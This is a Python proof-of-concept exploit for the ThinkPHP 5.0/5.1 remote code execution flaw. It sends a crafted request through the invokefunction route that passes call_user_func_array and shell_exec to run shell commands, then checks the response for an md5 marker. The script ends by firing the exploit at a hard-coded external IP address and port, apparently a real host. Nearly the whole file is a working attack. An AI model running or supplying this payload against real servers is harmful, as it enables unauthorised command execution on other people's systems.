'''POC
GET  http://your-ip:8080/index.php?s=/Index/\think\app/invokefunction&function=call_user_func_array&vars[0]=shell_exec&vars[1][]=uname
'''

import requests

from lib.core.md5 import random_md5

random_string, random_md5 = random_md5()

def verify(ip, port, cmd=f"echo -n '{random_string}'|md5sum|cut -d ' ' -f1"):
    response = requests.get(
        fr"http://{ip}:{port}/index.php?s=/Index/\think\app/invokefunction&function=call_user_func_array&vars[0]=shell_exec&vars[1][]={cmd}")
    if random_md5 in response.text:
        return {
            "name": "ThinkPHP5 5.0.*/5.1.* RCE",
            "target": f"{ip}:{port}"
        }
    else:
        return None

print(verify("107.174.27.242", 8078))
